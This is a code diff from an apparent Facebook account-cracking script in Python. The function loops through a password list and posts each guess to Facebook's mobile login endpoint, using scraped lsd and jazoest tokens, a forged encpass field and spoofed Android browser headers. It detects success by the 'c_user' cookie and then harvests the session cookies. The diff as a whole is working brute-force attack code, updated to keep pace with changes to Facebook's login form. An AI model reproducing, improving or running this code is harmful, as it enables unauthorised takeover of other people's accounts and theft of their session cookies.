@@ -1127,52 +1127,61 @@ def mbasic(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com').text
+            free_fb = Session.get('https://touch.facebook.com/').text
             data = {
+            'try_number': '0',
+            'unrecognized_tries': '0',
             'email': uid,
-            'cuid': '',
-            'guid': 'f6029ec83f0827e49',
-            'lgnjs': '1736441523',
-            'lgnrnd': '085156_8J63',
-            'locale': 'en_GB',
-            'login_source': 'comet_login_header',
-            'next': 'https://www.facebook.com/jhhkk',
-            'skstamp': '',
-            'timezone': '-330',
             'prefill_contact_point': '',
             'prefill_source': '',
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'false',
+            'is_smart_lock': 'false',
+            'bi_xrwh': '0',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            'bi_wvdp': '',
+            'fb_dtsg': '',
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'ab_test_data': 'A/AAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAVV//AVAqAABFAB',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            cookies = {
-            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
-            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.Bnf_2c.AWWX7ks0f1g',
-            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
-            'ps_l': '1',
-            'ps_n': '1',
-            'wd': '1440x402',}
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            '__dyn': '',
+            '__csr': '',
+            '__req': random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]),
+            '__fmt': '0',
+            '__a': '',
+            '__user': '0'}
             headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Referer': 'https://www.facebook.com/jhhkk',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://www.facebook.com',
-            'DNT': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 7; Lenovo K13; Windows 10 Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/100.0.4863.134 Mobile Safari/537.36',
+            'accept-encoding': 'gzip, deflate, br, zstd',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-User': '?1',
-            'Priority': 'u=0, i',
-            'Pragma': 'no-cache',
-            'Cache-Control': 'no-cache',}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1'
-            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
+            'Host': 'touch.facebook.com',
+            'method': 'POST',
+            'path': '/login/device-based/login/async/',
+            'scheme': 'https',
+            'content-length': '23',
+            'dpr': '2.768749952316284',
+            'sec-ch-ua': '"Android WebView";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '""',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-full-version-list': '',
+            'sec-ch-prefers-color-scheme': 'light',
+            'upgrade-insecure-requests': '1',
+            'dnt': '1',
+            'origin': 'https://m.prod.facebook.com',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=2171902329619611&kid_directed_site=0&app_id=2171902329619611&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fapp_id%3D2171902329619611%26cbt%3D1712718663368%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd3261f9021c25370%2526domain%253Dapp.simplified.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fapp.simplified.com%25252Ffe8330d455a57b530%2526relation%253Dopener%26client_id%3D2171902329619611%26display%3Dtouch%26domain%3Dapp.simplified.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fapp.simplified.com%252Flogin%253Fredirect%253D%252Fvideo%2526_gl%253D1%252Aaiox86%252A_ga%252ANTY3NjE0MTg1LjE3MTI3MTg1MjI.%252A_ga_R70FZY7SM9%252AMTcxMjcxODUyMS4xLjEuMTcxMjcxODUyMi41OS4wLjA.%26locale%3Den_US%26logger_id%3Dfb7d32d55c8631da9%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df79832064cb2789df%2526domain%253Dapp.simplified.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fapp.simplified.com%25252Ffe8330d455a57b530%2526relation%253Dopener%2526frame%253Dfb96289a58feadea5%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
+            'x-requested-with': 'mark.via.gp',
+            'sec-fetch-site': 'none',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'document',
+            'accept-language': 'en-IN,en-US;q=0.9,en;q=0.8'}
+            url = 'https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8'
+            po = Session.post(url, data=data, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
